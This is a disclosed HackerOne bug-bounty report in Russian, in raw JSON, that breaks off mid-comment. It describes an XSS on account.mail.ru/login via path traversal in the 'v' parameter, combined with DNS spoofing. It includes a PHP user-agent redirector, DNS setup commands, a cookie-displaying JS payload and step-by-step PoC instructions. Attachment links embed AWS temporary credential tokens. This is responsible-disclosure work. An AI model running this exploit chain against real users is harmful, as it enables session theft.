{"id":291522,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTE1MjI=","url":"https://hackerone.com/reports/291522","title":"XSS on account.mail.ru/login","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-11-18T16:24:10.588Z","submitted_at":"2017-11-18T16:24:10.588Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"obmi","url":"/obmi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":65,"url":"https://hackerone.com/mailru","handle":"mailru","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Mail.ru","twitter_handle":"mailru","website":"https://corp.mail.ru","about":"Building the Internet since 1998"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-01-26T14:11:48.737Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-12-27T14:11:31.863Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"1. Уязвимость на станице https://account.mail.ru/login и подготовка файлов для атаки\n---------------------\n\nВ процессе исследования заметил, что на странице https://account.mail.ru/login не валидируется значение параметра v. Значение выводится на странице как есть и используется в пути до скрипта (т.е. атакующий может его изменить). \n\nПример:\n\n{F240637}\n\n2. Подмена хостов и загрузка ресурсов с другого домена.\n---------------------\n\nЯ предположил, что атака возможна, если заставить клиента скачивать скрипт с домена files.imgsmail.ru, меняя пусть к нему через уязвимость параметра v (описано выше)\nНа домене files.imgsmail.ru хостятся юзерские файлы, которые отправляются через агент. Единственное условие доступа к ним - совпадение юзерагента, поэтому нужен редиректор, приведенный ниже.\n\nУ атакующего нет возможности подменить домен с которого будет идти загрузка скрипта или контролировать содержимое файлов на img.imgsmail.ru. Если только он не контролирует dns сервер, которым пользуется жертва или вообще точку доступа (такое возможно, например в публичных сетях в кафе или торговом центре). Если dns сервер будет возвращать A запись о том, что img.imgsmail.ru соответствует адресу 178.237.20.77 (настоящий IP адрес для домена files.imgsmail.ru, откуда отдаются файлы, загруженные в agent), то браузер будет пытаться грузить ресурсы оттуда (а вот на files.imgsmail.ru атакер уже может заливать свой контент). \nДля теста я поднял и настроил dnsmasq по адресу 52.34.103.214 и вбил настройки в домашний роутер:\n\n```\nmihailob@kali:~dig  '@52.34.103.214' +short img.imgsmail.ru\n94.100.180.102\n```\n\n```\nmihailob@kali:~$ host img.imgsmail.ru\n\u003cimg.imgsmail.ru has address 94.100.180.102\n```\n\nНебольшое препятствие заключается в том, что сервер files.imgsmail.ru при доступе к файлам агента по прямой ссылке идентифицирует клиента по user-agent строчке. Поэтому атакующему необходимо загрузить файлы с необходимымы юзерагентами и составить табличку для нужных редиректов.\nЯ сделал такой простенький скрипт у себя на сервере:\n\n```\n\u003c?php\n$client_ua = $_SERVER['HTTP_USER_AGENT'];\n\n//var_dump($client_ua);\n$redirect_url = 'https://account.mail.ru/login?v=0.3.13/../../../get/';\n$ua_routes = [\n        //FF Linux\n    'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' =\u003e 'xgLens3gSCg20hivTRagWNJRagV09F1hUtAC3K9CioIhdEw7VhTMdkGKwqR9chXUcSWxg0hVDsrc1XBxfAMPWsZ7Mtigx6UIAKNvO1wguGm9lswX92YxmurFLxsehkKgsbKUWhd6Ds0gMFnvrx4bgpghRlTRag/test.js??',\n    //Win NT 6.1\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0' =\u003e 'ourROgRyY0ku4SBxmNtiAftNtiueG2xIF0E4niIFY8QIhIbSNsOVm37svkC3JIphAJEIaiT0sGnh6tRSGm4R0SdBEljIzlaJs1qhqp5Gqf7XO1rnnHZGOMD5WSuuwJgikJd8dGSM67pSOzv2ks0kPTQScKmNti/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0' =\u003e 'om2NJuByvqNogCHXvaUt3GvaUt8jzMdXpH9uotxgNnECLY1b2iY42SrCo5cJpmzPshamovxhUXZqzTztSdzOGCiG1kgCwriFECVb3g2tKaoeUiDpXzLmezd2mCMd7OhXQj0qDXddq6iChpGYRtkicPECWXvaUt/test.js??',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0' =\u003e 'wFzJqfD5AQJjR1iyVvMGOQ4vMGqrIUxiC1gHvSqrfHAGWB6a0GMrG2HGPEJyC1Cypecsy2RraIqVyJy1RMCogGVAlL61qhB7mSrlrrys701JPsfU91gSA4ckgi563H71Rvl5EG4zFFX1GQjhHSIwZF2IW2VvMG/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0' =\u003e 'ZbDbdu16AYF2010DXyISt0XyIS8SL2IIu0tr5SJ7UdaGi36yIGVG9KsIzpfxfSgpKTQIxpPCK1nqHVrSDiKB6sX7udJGtvrvCGzHFiGiMXQy01KUVdqGAeVAI1zQ04miHe9zmGQGCYT1ejo80I9jr8tGwjXyIS/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0' =\u003e 'vpRuf62pV0FyCGmoE7Xi77a7XiCmcARSNSutsG4eO2nIxKm7fIOrW84InQz1tSLKAuWSdBHP6s876juGylvbbGbAl5f1GNYak1Mjgt7SM1p5aSMANl6SU1XSsIt8DaMIdOFiqIyxIRHSd7XIWSaTodKGoaE7Xi/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' =\u003e 'OQLdZufaBxzcnxFr2znRM2znxHWlfdxeS07oKsAlw7KZOCFuKfqpmPhpcdleKAD4SusbGUK9KnmZsBgADpt9g40VtXsISqZXKkALtGsaisTMhGVd8HxJeXbph7ggAphyBpY9h3sXk4hUcXEbxQ5pXOxE82znx/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0' =\u003e 'OQLdZufaBxzcnxFr2znRM2znxHWlfdxeS07oKsAlw7KZOCFuKfqpmPhpcdleKAD4SusbGUK9KnmZsBgADpt9g40VtXsISqZXKkALtGsaisTMhGVd8HxJeXbph7ggAphyBpY9h3sXk4hUcXEbxQ5pXOxE82znx/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0' =\u003e 'mKXu3WpU65pDSClK0xEX6LQxEXBgQwImV93momlfXCwikA6ZWmTyuy6CTuLopXBuoDaiWqJ8cXEiIMNifkxqAC5v26vmQs6cBC8RFHJCsFfxXtTIGw0ihPyLImUAkW7XENNugtsCcbgmJLrvJmzCSreiIh0xEX/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0' =\u003e 'jUhPoHrrhcc2lXqPoiJCIzoiJCvMWqQCwDCu2X25qzimWNoj0tg3BU5XWQYMDtL3TX3CLlUdaiCPvxltOGtyXtLmqGRta445TC4syJaCa8oENmjNRwdtB1ugEiRLlBOtBafDytPomFNtjbSIUig1vxoi27oiJC/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0' =\u003e 'Pz4beFySYDyPP1RYUXbSHDcXbSWgeaNG853xb1IRUGpSV9Lj31ZGjtjGnqV3KG8gGvxIsFfOkGlEfjSIuAqBWSvebheGriFXGiyTHJgGdrBJpIeI6JvS0czWoS6lW3P1JQjOxIcawsaG1Wv8KigoWd5GCDUXbS/test.js?',\n    //\n    'Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0' =\u003e 'a4rrNIMBcXes0sJCPoQgHRToQg53mk5gR3hkLhII1c4gMIQWjxxttkHKTylx3sOn98yKI2nGgK9e2DZxurDPgxGZFcchE5vNtxCIgeosiTjRfsMlSFah9af5HKsbmfvg6CBrnx45lCVsZuPDvKShMVaxtnPoQg/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:49.0) Gecko/20100101 Firefox/49.0' =\u003e 'SM7AU6KcSv4OoIbTfXlIoJ9XlIIFzvmS4zlFUGxBtfdGyqJDbIvImUjS9oCLJsCyajIGvj0gAGCecXtIV617TIrhBpa1UmvUVG9O8or1vevoIiU4xnZSco5Ss1eSsxsI4ARuPICyDYjILLqGnSUIo1iifJfXlI/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0' =\u003e 'qBcio58DE2Ty5ZKzZduZPKAduZTU8YbWqwjPjnb84lQRVWcybAhUu7pnhH5XaZndQHLnGGRrqAcQInZA8QwH4WNytuqAQ9QB4nq5XijRAVzAiZ0WqU5RagJNOnXuIbaAaZ8zbRVVltpRjcI4wWWIarknezZduZ/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0' =\u003e 'qBcio58DE2Ty5ZKzZduZPKAduZTU8YbWqwjPjnb84lQRVWcybAhUu7pnhH5XaZndQHLnGGRrqAcQInZA8QwH4WNytuqAQ9QB4nq5XijRAVzAiZ0WqU5RagJNOnXuIbaAaZ8zbRVVltpRjcI4wWWIarknezZduZ/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0' =\u003e 'klBBESp2lWvq4KkR8e2gBs0e2gRSxqRsuzYzFKTXCeBx2izlqx1DmuxxlWqmssq1FT6hqc55IKREonIgs6EZHg1CriJKT8ApLx0X1bUgZaSVaKixf9RKG0aA8giwofJxoeC0XhVhtWBgDtqQtsh42PJKr38e2g/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:53.0) Gecko/20100101 Firefox/53.0' =\u003e 'dpDeMJHxyWyFOKxLulIsvxPlIsilnLIg0fpjyxnHR2nhwa7uih9dRLZg3gmgXgFvNpcx2TJqyKTRn8ehTWKmAhADBKsKD99cssN1dCSsJY0KMhlGNX0hRRKkpsMLGCIsAg7ZFhpLa3RgflEFahAqIWAsaBulIs/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0' =\u003e 'RbDCzTqxyZWfIKxLJ8us8B58usUJ4v9xsdGiAxQv6DbgjO3kAh1YCWPKEO8n2xGGogsxVPKvJhWUz91x81qLExT2mT6hDLPEgKcYz8KhKwWsGhl06zIh5Gs3rs5vPzZxLdBPoKE0Heag7An8AsYQOsLKv2J8us/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:55.0) Gecko/20100101 Firefox/55.0' =\u003e 'kEOixDxyes0DHxLBBlAKx3LlAKNrNcrKeyJDdxJN7Xrg6snWsKqiMI3KgJz6Bxau1LjsnbaaHxO2pQjgfuNhjx4MrVXsowA7whUhLIwKGMWkjxnz6YIKns97Wh12BnMxbgVaphPxiMdsZ6t97KVpaGzgQkBlAK/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:56.0) Gecko/20100101 Firefox/56.0' =\u003e 'OlNqOVzneOQjNXur6pDCWiUpDCnE4uYX7qIOPioH923ChlQzwiXkfmpmhKTOrmTesUwCf9i8yXLREVRmciRc0iKsQBktwmTfgmTXkJWmCtUXqmYOwlsXC09GjCC0AoLX0zupzir3ns0tZP7VNC8xDLsXW86pDC/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0' =\u003e 'mHkTlJNUd65apnQxf1PWM7Y1PWnRAFyWxpPSwZFcg3GRN9EMDWBdAhaZZQrEQnSaBuCRqEBBARNHzNyZHKQKGA1Guo0n9ZMYGWWW6a2ZmgQdRRm7va9nVkmEsABj2FaZoXv3rZoOHLqAAVX1JWlJcD9Wqy91PW/test.js?',\n    //Win NT.10\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0' =\u003e 'YuXAP8AuGn7HFgyjjItsHsbItsgrGpSg9q42KxpdeNXKShwfoxhgUyCgMlEeHghTqrhx15zvixqb2j9K8lalnsknzbWsdIXqpxE3lsQs1zVRzxS0uTzx0hjZSxxhZa0KOloWss4UQsMhO6d7HhlFPPBKcDjIts/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0' =\u003e 'YxXfyOWmUU2w2nvkZHQWIenHQWyzdtbn1rqp0AIn13aZ0gKJWWNVWI6AKqG6RZzccBanM2IMEn3EgRcZuIBV6AB7X5dAuzHveZMhj1YZrWxQtRZh78jZhn5L1niXX8uAAklusn7Av4gAM1aQIZu73OwZZHZHQW/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0' =\u003e 'bYBZTCrdm8jZ9mlxvzjiyLlzjiALh3hX2QSGxmLcoJ3XrqhhTC7Kd4NXd6aMDCW78HzC77kCFtr5KCVXRRnRMtbkcPCtaiV8XXi6MnHC53VPEik7clECewpF3C2XHXWtvXT3EtPK90RtzN4FUi8YbAfm3ybzji/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0' =\u003e 'QOBjrepKtgoa5gg0kH6rokH6xyIuiugzk7T6Kokm1vsp3hCJh3Mvs5hO41oTg6PtjDgKEeTNhFzbO8Kf4fLmgzJ4c3Ktulb3s8hZR6KMrYCoxvs9mxx4VgA2gOjFZihVO8kNxCdyMgK90tRKhvVKl9sE4kH6x/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0' =\u003e 'crUcnsXPdDZgbIGEwrlSzqPrlSXmTtCGM6OTTsft9AD1KUKNCGqlScKGGvjTUsPliaJ18qQx6sPTJA21I3qEbIrulcUGiFNbBsILbB0G3aRhnGOjSze1QZFsU1OnUqSIuua8oGXMh4RIrYbkDSG34V1inawrlS/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0' =\u003e 'wCdB7I5zX5NNCtpyW5bXXZZ5bXVCSqltWhOS3XQ4iFItagpystwjZmFCJs40JCmGXJitGT02YXoMJF9tlYxz9Crk5RaCq9ZHECvcauHiaUymNC4fINLi9LiASXJWFGZXua6IstlkEwNtt39pTt70YVUmd2W5bX/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0' =\u003e 'oTBkcbOHuUcYsWqqDsdWCPYsdW5PhHPAYOV3QZz5k1jZJjnwLAezYKpR8NEiAnYaegunHlqqbnUWgVUnZVt4NWKDFVQWfPwwUn5Dc9kZ6YaiQnSbR8rZSI6kgnkFg35nSMDzFWOAjZ7nb9zyYRFAwy3AlEDsdW/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0' =\u003e 'fy9ixvQKJIH4lKg9BZGhb7kZGhrSpIBhljfuPx0zOJoKQZZZDhFHBZ3sRY3hkxGvrBdxR8lsvsSP7JNhwWDL3g5fnSSsJjwtdhyrtArxwuUOmKpFN0WgUPsywgmhUIqh2k1qeh5BU1dgexFXnxTnr0HxERBZGh/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0' =\u003e 'aaSPTTusNXXrUgXx088gFF888guu4vBhi4RD8sz3ojNgDG4zQhf2bNpglMlBChpaXbuKb6issggYXSBKWfNo8KTXFckhpTqLtgnjQT4stW5fwKR3IC6g0ruobhSQwEhg19z8es3NN2uxp1VUhxrtmoBhryQ88g/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0' =\u003e 'Oya1mq9p9w2HatCXHuqmqw6uqm7MrGmXyUAngtAHciQX6St13mapMvRtOY8glidLOJbCN4Aw4CEVvy3m3ZEKwiDTE39tnwoZbiy9UzLXQVDLliJPoq8tciHsVXw9nYNt8ndmyX96lUJmlao4gtgk7ymCUXHuqm/test.js?',\n    //\n];\n\nif (!empty( $ua_routes[$client_ua] ) ) {\n        $destination = $redirect_url . $ua_routes[$client_ua];\n        header('Location: ' . $destination);\n}\nelse {\n        header(\"Content-Type: text/plain\");\n        echo 'Unknown user-agent:\u003c'.$client_ua.'\u003e';\n}\n```\n\nЯ заранее понаотправлял файлы через агент своему контакту с вышеприведенными юзерагентами. Содержимое загруженного файла было одинаково во всех случаях:\n\n```\nmihailob@kali:~/tmp cat test.js \nalert('Hello i am attacker script from uploaded file via agent. The script was executed on a domain:' + document.domain + '. The cookie are: ' + document.cookie );\n```\n\n{F240638}\n\n3. Сценарий атаки\n---------------------\n\n1. атакер конфигурирует сеть таким образом, что в качестве dns'а используется подконтрольный ему сервер. По запросу img.imgsmail.ru он будет давать ip 178.237.20.77 (адрес files.imgsmail.ru):\n2. жертва подключается к такой сети\n3. жертва открывает страницу по ссылке откуда-нибудь (ну или атакер подмешивает ей автоматическое открытие в http трафик, как делают показ рекламы в московском метро или в мобильном интернете) и запускает код атакующего\n\n4. POC:\n---------------------\n\nСтабильно воспроизводится в последнем Firefox, но не работает в Google chrome (в данном примере не работает потому что хрому нужен явный content-type для js). Думаю, что Firefox'а достаточно для пруфа.\n\n1. Выставить в настройках сети dns сервер: 52.34.103.214. \n2. Открыть ссылку-редиректор: https://obmhld.com/pocs/?token=b0c93dc547233c441e2316d87ff067c2\n\nЕсли вашего юзерагента не оказалось в моем списке - вы можете сами выставить на клиенте нужный юзерагент, который уже есть в редиректоре, чтобы убедиться в работоспособности сценария. Список приведен выше в исходниках редиректора.\nЕсли по каким-то причинам вы не можете использовать существующий - напишите мне, пожалуйста, - я добавлю ваш user-agent в список.\n\nЗаписал видео, как это выглядит у жертвы (браузер под виртуалкой - firefox 57 под win7, без дополнений и расширений, никаких манипуляций с сертификатами не проводил )\n\n{F240639}\n\n5. Как починить:\n---------------------\n\nКак быстрофикс - можно провалидировать хосты на машинах в конфиге nginx'а, чтобы не было возможности обращаться к серверу 178.237.20.77 с заголовком Host: img.imgsmail.ru.\nТакже нужно добавить более жесткую валидацию параметра v на странице https://account.mail.ru/login?\n\nP.S. Я уверен что в реальности сценарий может быть еще проще, если атакующий контролирует всю сеть. Он может, к примеру, заменить ответ на любой http запрос с целью редиректа пользователя с нужным параметром автоматически, такое можно наблюдать в московской подземке, где подмешивается реклама в контент http страниц или у мобильных операторов, мтс (по крайней мере в Москве) подсовывает свою рекламу в http ответы.\n\nP.S.p.s. Если что-то описал не совсем понятно - дайте мне знать, буду рад помочь.","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":30,"name":"Man-in-the-Middle"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":240637,"file_name":"screen_002.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/637/f5c44ed42fc26e34c52ef93e7119a50c7360cb1f/screen_002.png?response-content-disposition=attachment%3B%20filename%3D%22screen_002.png%22%3B%20filename%2A%3DUTF-8%27%27screen_002.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=942fed6297be96da62374b8efc6d852b9e4a9cb63532d65f1e72431eb82ac98a","file_size":201518,"type":"image/png"},{"id":240638,"file_name":"screen_003.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/638/7e4ed82227e3a28cbf64a8819d8b103862f8e8c5/screen_003.png?response-content-disposition=attachment%3B%20filename%3D%22screen_003.png%22%3B%20filename%2A%3DUTF-8%27%27screen_003.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5b890f7dd995b3179bfee8fdc6bceb953f98d899b5de30b748d037953da98f11","file_size":68807,"type":"image/png"},{"id":240639,"file_name":"Screencast_18.11.2017_18_16_10.webm","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/639/d0650584495ef97d545e2aa0088f12c21109e6fe/Screencast_18.11.2017_18_16_10.webm?response-content-disposition=attachment%3B%20filename%3D%22Screencast_18.11.2017_18_16_10.webm%22%3B%20filename%2A%3DUTF-8%27%27Screencast_18.11.2017_18_16_10.webm\u0026response-content-type=video%2Fwebm\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7367e5593b2eaaf3758d18f547f0b5383bedb910cc4add16a7b7433808ea1962","file_size":1481165,"type":"video/webm"}],"allow_singular_disclosure_at":"2018-01-26T14:11:31.936Z","allow_singular_disclosure_after":-116987269.92494859,"singular_disclosure_allowed":true,"vote_count":8,"voters":["secator","s_p_q_r","theappsec","eveeez","whitesector","khizer47","cr4xerbik4sh","3apa3a"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":258,"asset_type":"URL","asset_identifier":"account.mail.ru","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2167496,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"UPD: первый заголовок неправильный, там просто про подмену пути должно быть. Подготовку файлов перенес во второй 